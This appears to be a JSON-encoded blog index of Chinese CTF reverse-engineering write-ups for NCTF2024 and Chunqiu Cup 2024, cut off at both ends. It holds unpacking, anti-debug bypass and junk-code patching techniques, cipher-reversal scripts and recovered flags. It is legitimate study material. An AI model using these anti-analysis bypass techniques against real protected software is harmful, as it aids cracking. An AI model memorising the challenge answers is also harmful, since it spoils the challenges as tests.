\u0026#34;AND\u0026#34;, 0xFE: \u0026#34;RET\u0026#34;, 0xFF: \u0026#34;HLT\u0026#34;, } var InstructionSetB = map[byte]string{ 0x13: \u0026#34;LDR\u0026#34;, 0x14: \u0026#34;LDRI\u0026#34;, 0x17: \u0026#34;STR\u0026#34;, 0x18: \u0026#34;STRI\u0026#34;, 0x2B: \u0026#34;MOV\u0026#34;, 0x91: \u0026#34;ADD\u0026#34;, 0x92: \u0026#34;SUB\u0026#34;, 0x97: \u0026#34;MUL\u0026#34;, 0xC1: \u0026#34;LSL\u0026#34;, 0xC3: \u0026#34;LSR\u0026#34;, 0xCA: \u0026#34;XOR\u0026#34;, 0xCB: \u0026#34;AND\u0026#34;, 0xFE: \u0026#34;RET\u0026#34;, 0xFF: \u0026#34;HLT\u0026#34;, } func dis(instrSet map[byte]string, bytecode [4]byte) { opcode := bytecode[0] operands := bytecode[1:] if instr, exists := instrSet[opcode]; exists { switch instr { case \u0026#34;LDR\u0026#34;: fallthrough case \u0026#34;STR\u0026#34;: fmt.Printf(\u0026#34;%s R%d, R%d\u0026#34;, instr, operands[0], operands[1]) case \u0026#34;LDRI\u0026#34;: fallthrough case \u0026#34;STRI\u0026#34;: fmt.Printf(\u0026#34;%s R%d, #%x\u0026#34;, instr, operands[0], operands[2]) case \u0026#34;MOV\u0026#34;: imm := int32(operands[1]) + int32(operands[2])\u0026lt;\u0026lt;8 fmt.Printf(\u0026#34;%s R%d, #%x\u0026#34;, instr, operands[0], imm) case \u0026#34;RET\u0026#34;: fmt.Printf(\u0026#34;%s R%d\u0026#34;, instr, operands[0]) case \u0026#34;HLT\u0026#34;: fmt.Printf(\u0026#34;%s\u0026#34;, instr) default: fmt.Printf(\u0026#34;%s R%d, R%d, R%d\u0026#34;, instr, operands[0], operands[1], operands[2]) } fmt.Print(\u0026#34;\\n\u0026#34;) } } func disasm(instrSet map[byte]string) { var instrcode [4]byte data, _ := os.ReadFile(\u0026#34;bytecode_dump.bin\u0026#34;) for i := 0; i \u0026lt; len(data); i += 4 { copy(instrcode[:], data[i:i+4]) dis(instrSet, instrcode) } } func main(){ disasm(InstructionSetA) disasm(InstructionSetB) } 如果能顺利还原字节码，那么这道题的难点就解决了。接下来就是根据可读性更好的汇编来分析加密算法。以第二个虚拟机执行的字节码为例。\n其实特征已经相当明显，看到 9e3779b9 就已经确定TEA系列，继续向下看移位部分，是xxtea的特征。唯一魔改的地方在于原来标准算法中的左移换成右移，右移换成左移。第一个虚拟机中算法没有改动，是标准xxtea。\n字节码虽然看起来很多，但基本上是若干轮循环的重复。两个vm密钥不同，不过都是在前几轮加密中通过 MOV 指令写入缓存，所以只需要逆前几轮循环，找齐密钥就可以去解密。\nkeyA := int32[4]{0x6e637466, 0x062ef0ed, 0xa78c0b4f, 0x32303234} keyB := int32[4]{0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446} ","date":"2025-03-23","externalUrl":null,"permalink":"/writeups/nctf2024_re_official/","section":"Writeups","summary":"official reverse writeup of NCTF2024","title":"NCTF2024 Reverse Official","type":"writeups"},{"content":" 夏季赛 # HardSignin # 查到了UPX壳，发现是魔改过的，不能直接脱。在010editor中看到upx壳的节区名UPX被改了，改回来后可以直接脱壳。\n32位程序，进行反汇编，又看到很多花指令。主要在TlsCallback的几个函数里面，而且这几个函数本身也常用来反调试。\n先patch掉所以花指令。但是发现main函数依然不能正常反汇编成指令。这里猜测可能有SMC代码自解密。查看TlsCallback_0，能够看到它把main函数的前170个字节异或了0x66加密。用idaPython脚本解密一下。\nimport idc import idaapi import idautils def smc_xorenc(src_addr,dst_addr,key): length = (dst_addr-src_addr) if (dst_addr\u0026gt;src_addr) else 0 for offset in range(length): addr = src_addr + offset value = idc.get_wide_byte(addr) enc_value = value^key ida_bytes.patch_byte(addr,enc_value) if __name__ == \u0026#34;__main__\u0026#34;: smc_xorenc(0x401890,0x401890+170,0x66) 重建 main 函数，F5查看伪码。除了常规的输入输出，加密函数是 sub_4016B0。\n继续跟踪该函数，分析加密流程：先对输入进行一次base64，之后每8位进行一次RC4（16轮），最后进行一次TEA。后面两次加密的key在 TlsCallback_2 中用随机数生成，种子已知。在 TlsCallback_1 中发现base64的编码表被打乱了顺序。属于魔改的base64。\n编写脚本进行解密。思路是先还原编码表。之后解密TEA和RC4，得到编码后的字符串。在Cyberchef上进行最后的解码。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void TEAdecrypt(int a1, unsigned char* a2, unsigned char* a3) { for (int i = 0; i \u0026lt; 16; i += 2) { unsigned int v7 = *(unsigned int*)(a2 + 4 * i); unsigned int v6 = *(unsigned int*)(a2 + 4 * i + 4); int v5 = 0x9E3779B9 * a1; // 0x9E3779B9 是 1640531527 for (int j = 0; j \u0026lt; a1; ++j) { v6 -= ((v7 + ((v7 \u0026gt;\u0026gt; 5) ^ (v7 \u0026lt;\u0026lt; 4))) ^ (v5 + *(unsigned int*)( a3 + 4 * ((v5 \u0026gt;\u0026gt; 11) \u0026amp; 3)))); v5 -= 0x9E3779B9; v7 -= ((v6 + ((v6 \u0026gt;\u0026gt; 5) ^ (v6 \u0026lt;\u0026lt; 4))) ^ (v5 + *(unsigned int*)( a3 + 4 * (v5 \u0026amp; 3)))); } *(unsigned int*)(a2 + 4 * i) = v7; *(unsigned int*)(a2 + 4 * i + 4) = v6; } } void RC4decrypt(unsigned char *a1,int a2,unsigned char *key,int length) { unsigned char s_box[256],v6[256],temp,t; for ( int i = 0; i \u0026lt; 256; ++i ) s_box[i] = i; for ( int j = 0; j \u0026lt; 256; ++j ) { v6[j] = key[j % length]; } int v4 = 0, v1 = 0, v2 = 0; for ( int k = 0; k \u0026lt; 256; ++k ) { v4 = (v6[k] + v4 + s_box[k]) % 256; temp = s_box[k]; s_box[k] = s_box[v4]; s_box[v4] = temp; } for ( int m = 0; m \u0026lt; a2; ++m) { v1 = (v1 + 1) % 256; v2 = (v2 + s_box[v1]) % 256; t = s_box[v1]; s_box[v1] = s_box[v2]; s_box[v2] = t; a1[m] ^= s_box[(s_box[v1] + s_box[v2]) % 256]; } } char table[] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; unsigned char data[] = { 0x59, 0x1B, 0xFD, 0xB4, 0x6B, 0xB8, 0xBE, 0xD9, 0xB3, 0xD3, 0x77, 0xD6, 0xF0, 0x65, 0x5F, 0x18, 0xA0, 0x9D, 0x3A, 0x53, 0x6D, 0x4A, 0x7B, 0x26, 0x74, 0x3A, 0x9C, 0x4E, 0x20, 0x43, 0x19, 0xD8, 0x72, 0xED, 0x95, 0xB5, 0x9C, 0x05, 0x22, 0x56, 0xCB, 0x7A, 0x11, 0x91, 0x9F, 0x7A, 0xBC, 0x0C, 0x4A, 0x69, 0x6D, 0xCE, 0x3D, 0xB4, 0xAB, 0x29, 0x61, 0xFA, 0x62, 0x32, 0xB4, 0xEC, 0x4C, 0xB6 }; int main() { srand(0x114514u); int v6,v4; unsigned char key1[17],key2[17]; for ( int i = 0; i \u0026lt; 100; ++i ) { v6 = rand() % 64; v4 = rand() % 64; char temp = table[v6]; table[v6] = table[v4]; table[v4] = temp; } printf(\u0026#34;%s\\n\u0026#34;,table); srand(0x1919810u); for (int i = 0; i\u0026lt;0x10; ++i ) { key1[i] = rand() % 255; key2[i] = rand() % 255; } TEAdecrypt(0x64,data,key2); RC4decrypt(data,64,key1,0x10); printf(\u0026#34;%s\u0026#34;,data); return 0; } //4yZRiNP8LoK/GSA5ElWkUjXtJCz7bMYcuFfpm6+hV0rxeHIdwv32QOTnqg1BDsa9 //C+vFCnHRGPghbmyQMXvFMRNd7fNCG8jcU+jcbnjRJTj2GTCOGUvgtOS0CTge7fNs02@ snack ( 复现 ) # 一个贪吃蛇游戏。运行发现是用pygame开发的，说明程序经过python打包，使用pyinstxtractor解包。\n这里的解包实际上不算成功。由于游戏程序的python版本和本地版本不符，所以pyz没有解压而是直接跳过。复现到后面发现需要用到 pyz_extracted 里面的库。这里更换python版本重新解包。\n之后尝试用uncompyle6进行反编译，但是出了问题。一开始怀疑pyc文件里有花指令一类的，后面换成了pycdc引擎结果成功了。估计问题还是在版本上\n反编译后的代码不多，加密逻辑是魔改的RC4，而且程序本身就有解密代码，直接copy下来用。(反编译生成的代码语法有一点小问题，s盒的交换还有后面列表推导式不能直接运行，需要改一下)\n解密密钥在自定义的库key中，这个就是上面提到的 pyz_extracted目录下的 key.pyc，反编译就能看到key\nkey_bytes = b\u0026#34;V3rY_v3Ry_Ez\u0026#34; def initialize(key): key_length = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % key_length]) % 256 S[i],S[j] = S[j],S[i] return S def generate_key_stream(S, length): i = 0 j = 0 key_stream = [] for _ in range(length): i = (i + 1) % 256 j = (j + S[i]) % 256 S[i],S[j] = S[j],S[i] key_stream.append(S[(S[i] + S[j]) % 256]) return key_stream def decrypt(data, key): S = initialize(key) key_stream = generate_key_stream(S, len(data)) decrypted_data = [ i ^ data[i] ^ key_stream[i] for i in range(len(data))] return decrypted_data data = [101,97,39,125,218,172,205,3,235,195,72,125,89,130,103,213, 120,227,193,67,174,71,162,248,244,12,238,92,160,203,185,155] decrypted_data = decrypt(bytes(data), key_bytes) print(bytes(decrypted_data)) BEDTEA ( 复现 ) # 反编译main函数的加密部分，先发现了两个反调试：一个是常规的IsDebuggerPresent() 调用API，结果保存到dword_404010，和后面加密过程有关系；另一个是用时间戳，两次调用system_clock::now 判断间隔时间。二者都可以在动调时改寄存器绕过。\n跟踪输入v15，定位到sub_401E80。跟进分析，函数分成两个部分：先修改程序的一段数据作为密钥（参考官方wp，算法是斐波那契）；后面是魔改的TEA，左移右移、delta还有轮数都改了。反编译的结果不太好分析，从汇编看比较清晰。生成密钥的初始值就是第一次反调试时得到的dword_404010。\n回到主函数，sub_401770和sub_401560两个函数这里踩了坑。一开始以为是没有实际功能的库函数一类的，看了官方wp才知道是二叉树的前序遍历和后序遍历。其实看到输入v17参数传进去，就应该猜到是加密的一部分。这里是把加密数据逆序了。\n后面调用了SSE指令集的xor指令，还额外多异或了一些无关数据。xor的值是固定的，直接写脚本即可。\n#include\u0026lt;stdio.h\u0026gt; void tea_decry(unsigned int *data, unsigned int *key) { unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x9e3449b8, number = 0x987e55d0; for (int i = 0; i \u0026lt; 22; i++) { d2 -= ((d1\u0026lt;\u0026lt;5) + key[2]) ^ ((d1\u0026gt;\u0026gt;4) + key[3]) ^ (d1 + number); d1 -= ((d2\u0026lt;\u0026lt;5) + key[0]) ^ ((d2\u0026gt;\u0026gt;4) + key[1]) ^ (d2 + number); number -= delta; } data[0] = d1; data[1] = d2; } int main() { unsigned int key[] = {3,5,8,13}, key2[] = {21,34,55,89}, key3[] = {144,233,377,610}; unsigned char datac[] ={ 0x76, 0x71, 0x9D, 0xE7, 0x70, 0x77, 0x3F, 0xA3, 0x02, 0xF1, 0x8D, 0xC9, 0x02, 0xC6, 0xA2, 0x4B, 0xBA, 0x19, 0x56, 0x05, 0xF2, 0x89, 0x5E, 0xE0 }; unsigned char *fd = datac,*bd = datac+23 ,tmp; for(int i = 0; i \u0026lt; 24; i ++) { datac[i] ^= 0x33; } while(fd \u0026lt; bd) { tmp = *fd; *(fd++) = *bd; *(bd--) = tmp; } unsigned int *data = (unsigned int *)datac; tea_decry(data, key); tea_decry(data+2, key2); tea_decry(data+4, key3); printf(\u0026#34;%s\\n\u0026#34;,(char*)data); return 0; } 冬季赛 Day1 # ezre # 自定义的md5，利用openssl库的md5函数，对程序text段的1204个字节取hash。实际上后面将近300个字节是未定义的，这一部分取0x0即可。通过动调查看内存也可以确定。\n在linux下动调发现MD5的结果有时会变，但是这一部分应该与输入无关，也就是固定的才对。赛后意识到是断点导致了内存中指令机器码发生变化。（应该考虑硬件断点，或者直接dump求MD5）\n按照正常的逻辑，主函数用MD5值的前4个字节，取随机数逐字节异或。关键还是找到正确的hash值，一般来说通过动调dump内存是最优解，但是断点的因素导致这一方法比较困难。开多线程分段爆破也是有效的方法。\nezgo # 有符号的Golang逆向，快速找到main部分。考虑到和c语言的差异，直接看反汇编CFG可能会比反编译伪码更清楚一些\nmain_init_0 用syscall 加载内核库中的IsDebuggerPresent 反调试，容易绕过。\n对base64进行换表，并且编码结果再 xor 0x0c\nTSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ 继续分析main_main，主要逻辑是提取zip文件的二进制数据进行解密，写入原文件中。程序要求输入4长度的字符串，经过魔改base64产生8字节密钥，参与后续的异或解密。\n程序中并没有关于flag的更多信息，猜测是保存在zip文件中，解题的目标应该是找到正确解密该文件的密钥。参考zip文件格式固定位置的一些magic number，实际上已知部分明文，而且加密算法只是异或这种单字节的线性运算。可以考虑转换成若干个方程，用z3约束求解\nmagic number：\n50 4b 03 04 14 00 感觉比较通用的方法是爆破，编码前密钥仅4字节且均为可见ascii字符，复杂度并不高。\n编写脚本还原程序的逻辑来爆破，效果最好但是难度很高，前提是要对题目程序逆得很透彻，而且脚本编写不能出错。爆破之前也要简单估计一下字符范围，密钥空间等，避免大规模的爆破。\nko0h # 算是签到题吧，经典inline hook并且加了花\n交叉引用 VirtualProtec t定位到 Tlscallback，找到hook后真正的主函数，逻辑是魔改RC4\n注意到有反调试，在其附近还能发现修改了RC4 key\ndata = [ 0x18,0x9c,0x47,0x3d,0x3b,0xe1,0x29,0x27,0x9f,0x34,0x83,0xd5,0xed,0xb5, 0x6e,0x59,0x7f,0xde,0x47,0xd7,0x65,0x3f,0x7a,0x33,0x5b,0x64,0xb6,0xfa, 0x94,0x55,0x87,0x42,0x20,0x06,0x0c,0x69,0xfe,0x72,0xa9,0xe4,0xd1,0x7c ] key = b\u0026#34;DDDDAAAASSSS\u0026#34; length = len(key) S = [m for m in range(256)] T = [key[n % length] for n in range(256)] j = 0 for i in range(256): j = (j + S[i] + T[i]) % 256 S[i],S[j] = S[j],S[i] i = j = t = 0 for k in range(len(data)): i = (i + 1) % 256 j = (j + S[i]) % 256 t = (S[i] + S[j]) % 256 S[i],S[j] = S[j],S[i] data[k] = (S[t] + data[k]) % 256 print(bytes(data)) ezvm # 加密部分勉强能看出来是变种XTEA，但是魔改得太狠了。\nvm使用 switch-case 实现，比较常规，字节码的长度也不算多。纯静态手撕的话应该是问题不大的。bytecode以4字节为单位，有一些冗余。\nB2 00 00 00 00 00 00 00 C4 00 00 00 04 00 00 00 B2 00 00 00 00 00 00 00 C5 00 00 00 06 00 00 00 D7 00 00 00 F4 00 00 00 E2 00 00 00 D8 00 00 00 03 00 00 00 C6 00 00 00 A1 00 00 00 A2 00 00 00 B3 00 00 00 00 00 00 00 C4 00 00 00 04 00 00 00 B3 00 00 00 00 00 00 00 C5 00 00 00 06 00 00 00 D7 00 00 00 F4 00 00 00 E1 00 00 00 D8 00 00 00 03 00 00 00 C6 00 00 00 A3 00 00 00 66 00 00 00 实际分析时发现一个 opcode 对应很多条汇编指令，导致 opcode 的含义比较模糊，而且各个 case 之间也会共享局部变量，所以各个字节码指令之间独立性不高，看起来更像是一段正常代码被拆成几部分，有一种控制流平坦化的感觉。\n尝试在运行时trace，恢复出vm的执行流程，可以看出加密有多轮循环。\n在trace结果中筛选出 switch 相关的部分。switch 本身通过跳转表实现，edx 控制跳转的地址，也就实现 case 的功能。\n结合伪码可以还原出加密整个流程。还缺一些运算用到的操作数，需要回到bytecode中确认一下\n另外 and 、xor 两个函数做了一点混淆，需要留意\n~(~a2 | ~a1); // and ~(a2 \u0026amp; a1) \u0026amp; ~(~a2 \u0026amp; ~a1);\t// xor 也可以尝试条件断点或者hook switch结构，效果可能比trace要好，这道题就不深究了。\n32轮，delta = 0x20252025， 其余魔改的点参考脚本\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char box[] = { 0xa4, 0xc4, 0x04, 0xce, 0x14, 0x95, 0xe9, 0x11, 0x31, 0x18, 0xb6, 0xb0, 0x01, 0x26, 0x24, 0x6a, 0x7b, 0x12, 0xcb, 0x67, 0xdb, 0xf8, 0xd2, 0x7e, 0x9d, 0xd0, 0x0c, 0x5f, 0x82, 0x21, 0x87, 0x83, 0x86, 0x7c, 0xc2, 0x9f, 0x29, 0xca, 0xbf, 0x49, 0xde, 0x4e, 0xcd, 0x62, 0x53, 0xbe, 0xa7, 0x03, 0x2f, 0xb5, 0xab, 0x94, 0xcc, 0x2e, 0x1d, 0xf3, 0x36, 0x10, 0xba, 0xd7, 0x13, 0x35, 0xe5, 0xb3, 0x81, 0x1a, 0xa0, 0xe7, 0x25, 0x75, 0xaf, 0x51, 0x43, 0x5c, 0x50, 0x48, 0xd8, 0xa3, 0x3f, 0x71, 0x7a, 0xc7, 0xc6, 0x90, 0xb1, 0xbb, 0xfa, 0xdd, 0xb9, 0xf6, 0xa9, 0xb7, 0x64, 0x38, 0xdf, 0xe0, 0x08, 0xb2, 0x77, 0x33, 0x5b, 0x02, 0x5e, 0x79, 0x61, 0x07, 0x69, 0x23, 0x57, 0x4a, 0xfd, 0xc0, 0x2b, 0xa1, 0xd1, 0x28, 0x09, 0x6f, 0x80, 0x55, 0xfe, 0x42, 0xe3, 0x47, 0x44, 0xe1, 0xff, 0xbc, 0x7d, 0x8b, 0x9a, 0x60, 0xad, 0x97, 0xfb, 0x8d, 0xd6, 0xac, 0x1e, 0x0f, 0x45, 0xea, 0xf5, 0x4b, 0x2d, 0x3b, 0x22, 0x1c, 0x5a, 0x72, 0x46, 0xc3, 0xe4, 0x5d, 0xda, 0x92, 0x9b, 0x0a, 0xbd, 0x99, 0x85, 0x34, 0x73, 0xa5, 0x56, 0x37, 0x4c, 0x16, 0x84, 0xa2, 0xb4, 0x6d, 0x54, 0xe6, 0xc1, 0x1f, 0x17, 0x3d, 0x88, 0xf7, 0x15, 0x58, 0xef, 0x4d, 0xee, 0x89, 0x68, 0x59, 0xb8, 0x20, 0xe8, 0xdc, 0xc9, 0x91, 0xfc, 0xd5, 0xc8, 0x41, 0x9e, 0x76, 0x78, 0x32, 0x19, 0x66, 0x65, 0x39, 0x6b, 0xc5, 0x52, 0x27, 0xa8, 0x06, 0x8e, 0xa6, 0x0d, 0x98, 0x8c, 0xf9, 0x05, 0x1b, 0x40, 0x8f, 0x4f, 0x3c, 0xeb, 0x70, 0xd9, 0x63, 0xd3, 0xe2, 0x2c, 0xf0, 0x93, 0x3a, 0xf4, 0x00, 0xf2, 0xaa, 0x7f, 0x2a, 0x30, 0xec, 0x6c, 0x74, 0x6e, 0xf1, 0x0e, 0x3e, 0xed, 0x96, 0xae, 0x8a, 0xcf, 0x0b, 0x9c, 0xd4 }; unsigned int substitute(unsigned int data) { unsigned char *bytes = (unsigned char *)\u0026amp;data; for(int i = 0; i \u0026lt; 4; i++) { for(int j = 0; j \u0026lt; 256; j++) { if(bytes[i] == box[j]) { bytes[i] = j; break; } } } return data; } void modify_xtea_decry(unsigned int *data, unsigned int *key) { unsigned int round = 32; unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x20252025, number = delta * round; for (int i = 0; i \u0026lt; round; i++) { d2 -= ( ((d1\u0026lt;\u0026lt;4) ^ (d1\u0026gt;\u0026gt;6) ^ 66) + d1) ^ (number + key[(number\u0026gt;\u0026gt;7) \u0026amp; 3]) ^ 3; number -= delta; d1 -= ( ((d2\u0026lt;\u0026lt;4) ^ (d2\u0026gt;\u0026gt;6) ^ 66) + d2) ^ (number + key[number \u0026amp; 3]) ^ 3; } data[0] = d1; data[1] = d2; } int main() { unsigned int data[] = { 0x83845981,0x34402115,0xFB1F53D2,0x547564C9,0x3B42FCC6, 0x2B67FCDE,0x675AB09C,0x1D47F41A,0x876D3272,0x734D7D95 }; unsigned int key[] = { 2,0,2,5 }; for(int k=0;k\u0026lt;10;k+=2) { data[k] = substitute(data[k]); } for(int i=0;i\u0026lt;5;i++) { modify_xtea_decry(data+2*i,key); } printf(\u0026#34;%s\u0026#34;,(char*)data); return 0; } 冬季赛 Day2 # skip # apk反编译，发现在native层检验用户名，java层检查password，二者合起来是flag\n对于java层的加密，结合函数名和反编译代码可以分析出是 skip32 ( skipjack ) 算法。github能找到对应解密脚本\n之后分析native的 libskip.so，只有一个加密函数。问一下DeepSeek分析出是DES算法。但是S盒经过修改，需要手动提取出来再解密。\n另外还要注意 JNI_onlode 反射修改了java层加密的ftable。这部分通过c++异常处理调用，看反编译伪码不容易发现，隐蔽性比较强，但是 其中std::runtime_error 也是有所提示。可以用frida hook出修改的结果。\nNu1tka # 小众而高端的python打包工具。通过DIE可以查出经过nuitka打包\n先尝试github上找到的解包工具 nuitka-extractor\n成功解包后有一个同名的exe文件以及几个动态库\n参考官方wp，该程序会创建新进程并执行。主函数中可以找到 CreateProcessW 这个API，在其参数 ApplicationName 地址处下硬件断点，找到进程对应的程序路径。不难发现该路径下临时文件夹中的文件和上述工具解包的结果相同，执行的是解包后的同名exe。（也就是说目标程序及其依赖库作为原程序的资源，在运行时才解包执行。继续动调发现主函数执行过后这些资源被删除）\n冬季赛 Day3 # easyasm # 入口点0x4c刚好是 start 函数。加密逻辑是逐字节异或再检验，一开始调用的 sub_84C0 修改了异或用的key\n起初静态分析修改key的算法，看起来很像冒泡排序，但汇编功力不够，不好直接确定\n用DOSBOX进行动态调试。没有折腾明白DOSBOX-X的debugger怎么用，于是就拿低配一点的debug进行分析。\n单步跳过直到 call sub_84C0 后面（貌似不能打断点？）dump下来 key 修改后对应的内存\n结合脚本进行解密\ncheck_data = [0x44, 0x7C, 0x43, 0x72, 0x1D, 0x72, 0x74, 0x41, 0x05, 0x14, 0x19, 0x1A, 0x19, 0x0F, 0xF5, 0x10, 0xAE, 0x18, 0x6D, 0x01, 0x10, 0x56, 0x00, 0x1E, 0x26, 0x71, 0x65, 0x73, 0x78, 0x72, 0xEB, 0x72, 0x52, 0x06, 0xAA, 0xBB, 0xA3, 0xA4, 0x1B, 0xFC, 0xC7, 0x82] encrypted_key = [0x22, 0x10, 0x22, 0x15, 0x66, 0x16, 0x11, 0x20, 0x30, 0x20, 0x21, 0x22, 0x2c, 0x22, 0xcc, 0x22, 0xcc, 0x2c, 0x40, 0x30, 0x21, 0x33, 0x66, 0x33, 0x44, 0x40, 0x50, 0x40, 0x55, 0x41, 0x88, 0x42, 0x33, 0x60, 0x99, 0x88, 0xc2, 0xc2, 0x22, 0xcc, 0xff, 0xff] for i in range(42): check_data[i] ^= encrypted_key[i] print(bytes(check_data)) ooooore # 脚本去花\n# ida-7.5 idapython import idc import idautils def nop(addr, endaddr): while addr \u0026lt;= endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1 def patch_junkcode(cur_addr,end_addr,pattern,nop_startoff,nop_endoff): while cur_addr\u0026lt;end_addr: cur_addr = idc.find_binary(cur_addr,SEARCH_DOWN,pattern) if cur_addr == idc.BADADDR: break nop(cur_addr + nop_startoff,cur_addr + nop_endoff) print(\u0026#34;patch address: \u0026#34; + hex(cur_addr)) cur_addr = idc.next_head(cur_addr) start_address = 0x1080 end_address = 0x7390 pattern1 = \u0026#34;0F 85 06 00 00 00 0F 84 01 00 00 00 21\u0026#34; # jz jnz pattern2 = \u0026#34;E8 00 00 00 00 48 83 04 24 08 C3 E8\u0026#34; # call ret pattern3 = \u0026#34;E9 00 00 00 00\u0026#34; # jmp $+5 patch_junkcode(start_address,end_address,pattern1,0,12) patch_junkcode(start_address,end_address,pattern2,0,11) patch_junkcode(start_address,end_address,pattern3,0,5) jnz jz call ret jmp $+5 貌似也会干扰反编译，一并patch掉即可\n修复后重新反编译（发现疑似控制流平坦化，d810处理效果一般）\n逻辑是比较简单的单字节异或，可以动调验证\n和谐 # hap鸿蒙逆向，分析思路和apk差不多。\n先改后缀为zip解压，找到其中的方舟字节码，即etc\\modules.abc。使用 abc-decompiler反编译。\n核心代码在Pages部分，只需要分析其中Index这个页面对应的类\n按照一般逆向题目的逻辑，加密之前先输入flag，所以找字符串输入函数或者控件。发现一个匿名函数中的 TextArea 符合要求\n向前回溯，发现 initialRender 这个方法调用该匿名函数来渲染控件。再次交叉引用来到主函数func_main，其中调用了构造函数 Index 进行初始化(并且储存了（key？密文？)\n一些API和库函数可以在鸿蒙官网查询：HarmonyOS NEXT开发文档\n接下来分析输入flag后的加密逻辑。先调用方法 d 检查flag长度和格式，之后调用方法 g 进行加密\n（官方wp：魔改SM4）\neasyvm # Cython实现的stack vm，通过py脚本交互。好在保留符号，逆起来应该轻松点\n由于是so库，在Linux python 3.8环境下尝试运行，用 help 和 dir 输出一些信息\n看出有一个 StackVM 类，大部分类方法是vm用到的指令handler。\n继续动态分析，尝试函数级hook，直接修改类属性发现没有写权限。\nfrom challenge import StackVM func_add = StackVM.__dict__[\u0026#34;vm_add\u0026#34;] def hook_add(): print(\u0026#34;Call add\u0026#34;) func_add() StackVM.__dict__[\u0026#34;vm_add\u0026#34;] = hook_add #TypeError: \u0026#39;mappingproxy\u0026#39; object does not support item assignment 不过可以考虑在子类中重写方法，之后运行虚拟机，实现类似trace的功能\nfrom challenge import StackVM null = \u0026#34;\u0026#34; func_map = StackVM.__dict__ class hookedVM(StackVM): def vm_push(self,val): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_push\u0026#34;,val)) func_map[\u0026#34;vm_push\u0026#34;](self,val) print(self.stack) def vm_pop(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_pop\u0026#34;,null)) func_map[\u0026#34;vm_pop\u0026#34;](self) print(self.stack) def vm_add(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_add\u0026#34;,null)) func_map[\u0026#34;vm_add\u0026#34;](self) print(self.stack) def vm_and(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_and\u0026#34;,null)) func_map[\u0026#34;vm_and\u0026#34;](self) print(self.stack) def vm_lsh(self,val): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_lsh\u0026#34;,val)) func_map[\u0026#34;vm_lsh\u0026#34;](self,val) print(self.stack) def vm_rsh(self,val): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_rsh\u0026#34;,val)) func_map[\u0026#34;vm_rsh\u0026#34;](self,val) print(self.stack) def vm_read(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_read\u0026#34;,null)) func_map[\u0026#34;vm_read\u0026#34;](self) print(self.stack) def vm_print(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_print\u0026#34;,null)) func_map[\u0026#34;vm_print\u0026#34;](self) print(self.stack) def vm_jmp(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_jmp\u0026#34;,null)) func_map[\u0026#34;vm_jmp\u0026#34;](self) print(self.stack) def vm_be(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_be\u0026#34;,null)) func_map[\u0026#34;vm_be\u0026#34;](self) print(self.stack) def vm_bl(self): print(\u0026#34;[Call Method] {} {}\u0026#34;.format(\u0026#34;vm_bl\u0026#34;,null)) func_map[\u0026#34;vm_bl\u0026#34;](self) print(self.stack) vm = hookedVM() flag = input(\u0026#34;Enter your flag: \u0026#34;) vm.input_buffer = list(flag) vm.vm_execute() 运行几次观察规律，大概推测出 vm_read 从 input_buffer 中读取字符，之后通过 vm_be 和压栈的数字进行比较，不相等直接 vm_jmp 跳转到错误分支，用 vm_print 逐字节输出信息。\n整个过程都是单字节加密，而且每个字符加密后立即比较。可以考虑多次执行，逐个爆破字符。\n测试爆破脚本的时候踩了两个坑：\n对于同一个vm对象只能调用一次 vm_execute 方法，如果重复调用则从第二次开始，只提示 \u0026quot;program stop\u0026quot; 而不运行bytecode。（猜测是有一个类似 rip 的全局变量指示字节码的地址，运行过一次vm之后这个变量没有重置） 栈上数据应当从后向前读取。vm执行到后面的时候 pop 没有严格和 push 对应，导致堆栈不平衡。栈前面遗留了一些垃圾数据。 from challenge import StackVM class solveVM(StackVM): buffer = [] def vm_print(self): pass def vm_be(self): current_char = self.stack[-3] target_char = self.stack[-2] if current_char == target_char: self.buffer = self.input_buffer else: self.buffer = self.input_buffer[:-1] StackVM.__dict__[\u0026#34;vm_be\u0026#34;](self) flag = [] digist_table = \u0026#34;0123456789\u0026#34; lower_table = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; supper_table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; brute_table = digist_table + lower_table + supper_table + \u0026#34;_-{}\u0026#34; while True: for char in brute_table: vm = solveVM() vm.input_buffer = flag vm.input_buffer.append(char) vm.vm_execute() flag = vm.buffer if len(flag) \u0026gt; 0: if flag[-1] == \u0026#34;}\u0026#34;: break print(\u0026#34;\u0026#34;.join(flag)) #flag{222cccf2-71b6-477b-bcea0f230e0e} ","date":"2025-01-20","externalUrl":null,"permalink":"/writeups/chunqiucup2024_re/","section":"Writeups","summary":"reverse writeup of chunqiuCup2024 summer \u0026amp; winter","title":"2024春秋杯网络安全联赛 Reverse","type":"writeups"},{"content":" BBRE # 主函数先调用 function2， 只检验了flag的前16字节。从另一个角度来看，它也只加密了16字节。\n但是输入的要求是 %19s，而且还有一个始终没被调用的 function1，怎么想都觉得有点奇怪吧。\n此事在deepseek中亦有记载\n实际上是分段加密并检验。中间通过隐蔽的栈溢出来劫持返回地址，改变控制流。\n分析 function0，其参数是经过 function2 加密后的字符串指针，内部调用包含漏洞的 strcpy 。简单分析一下栈帧，dst 在 ebp - 0x0c 